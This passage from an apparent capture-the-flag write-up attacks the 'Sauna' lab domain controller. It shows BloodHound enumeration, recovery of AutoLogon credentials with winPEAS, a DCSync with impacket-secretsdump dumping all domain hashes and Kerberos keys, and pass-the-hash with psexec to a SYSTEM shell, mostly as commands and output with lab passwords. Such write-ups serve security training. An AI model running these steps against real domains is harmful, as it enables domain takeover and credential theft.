memberof:                      CN=Remote Management Users,CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL
msds-supportedencryptiontypes: 0
name:                          Fergus Smith
objectcategory:                CN=Person,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
objectclass:                   top,
                               person,
                               organizationalPerson,
                               user
objectguid:                    b6a6403e-a7df-4abf-b'92fb'-b5bf1a5e3aed
objectsid:                     S-1-5-21-2966785786-3096785034-1186376766-1105
primarygroupid:                513
profilepath:
pwdlastset:                    2020-01-23 11:45:19.047096
samaccountname:                FSmith
samaccounttype:                805306368
scriptpath:
sn:                            Smith
useraccountcontrol:            ['NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD', 'DONT_REQ_PREAUTH']
userprincipalname:             FSmith@EGOTISTICAL-BANK.LOCAL
usnchanged:                    102468
usncreated:                    12840
whenchanged:                   2021-11-05 21:52:42
whencreated:                   2020-01-23 14:44:05
```

Nothing that we didn't already know.

Run BloodHound's Python collector to gather information on the domain's relationships.

```bash
$ bloodhound-python -d egotistical-bank.local -u fsmith -p Thestrokes23 -c All -ns 10.129.95.180
INFO: Found AD domain: egotistical-bank.local
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Found 6 users
INFO: Connecting to GC LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Found 51 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Done in 00M 08S
```

Import the collected data into BloodHound.

Going through the various pre-built queries, there appears to be a user account `egotistical-bank.local\svc_loanmgr` that has DCSync privileges on the domain.

![](images/Pasted%20image%2020211105134532.png)

However, there doesn't seem to be any interesting permissions from `egotistical-bank.local\fsmith` to anywhere significant (`svc_loanmgr` included). It appears that local privilege escalation is the only way forward.

---

## Privilege Escalation Enumeration

Uploading and running winPEAS on the target, it appears the `svc_loanmgr` account has AutoLogin credentials.

```txt
...
Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!
...
```

---

## DCSync

BloodHound indicates that `egotistical-bank.local\svc_loanmgr` has DCSync privileges on the domain. Use its credentials to DCSync the domain controller and dump the domain's hashes.

```bash
$ impacket-secretsdump -just-dc egotistical-bank.local/svc_loanmgr:'Moneymakestheworldgoround!'@10.129.95.180 -debug
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[+] Session resume file will be sessionresume_PFviMUya
[+] Calling DRSCrackNames for S-1-5-21-2966785786-3096785034-1186376766-500
[+] Calling DRSGetNCChanges for {21368e06-7c54-4cd5-9421-8186a6d29f66}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=Administrator,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-2966785786-3096785034-1186376766-501
[+] Calling DRSGetNCChanges for {b1298768-336d-40ba-a901-1da65816b899}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=Guest,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-2966785786-3096785034-1186376766-502
[+] Calling DRSGetNCChanges for {63708f6a-ff17-4c00-9d92-dae7b3f739ec}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=krbtgt,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-2966785786-3096785034-1186376766-1103
[+] Calling DRSGetNCChanges for {9283072d-a2e1-4f8b-a34b-a16d6a979fa3}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-2966785786-3096785034-1186376766-1105
[+] Calling DRSGetNCChanges for {b6a6403e-a7df-4abf-92fb-b5bf1a5e3aed}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=Fergus Smith,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-2966785786-3096785034-1186376766-1108
[+] Calling DRSGetNCChanges for {c84a4266-b01d-4a64-8c2d-ed930d18c489}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=L Manager,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Calling DRSCrackNames for S-1-5-21-2966785786-3096785034-1186376766-1000
[+] Calling DRSGetNCChanges for {9f1d1db5-ce78-498d-aa90-16781495f771}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=SAUNA,OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:4b4b567cb485bcc532047232ab2a1f68:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Finished processing and printing user's hashes, now printing supplemental information
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:f1ced52d1a25ecc916b297709880823a51f6d9dccf83d8aaf98f0b731df23067
SAUNA$:aes128-cts-hmac-sha1-96:d7dd5c8ffdeb9004b04821448a0b304d
SAUNA$:des-cbc-md5:890bc43dfe5d40a7
[*] Cleaning up...
```

Pass the domain administrator's hash to access the machine via WinRM and grab the root flag.

```bash
$ impacket-psexec egotistical-bank.local/Administrator@10.129.95.180 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.129.95.180.....
[*] Found writable share ADMIN$
[*] Uploading file hsUJMbEh.exe
[*] Opening SVCManager on 10.129.95.180.....
[*] Creating service tMUE on 10.129.95.180.....
[*] Starting service tMUE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.973]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>dir C:\Users\Administrator\Desktop\root.txt
 Volume in drive C has no label.
 Volume Serial Number is 489C-D8FC

 Directory of C:\Users\Administrator\Desktop

11/05/2021  02:52 PM                34 root.txt
               1 File(s)             34 bytes
               0 Dir(s)   7,830,237,184 bytes free
```
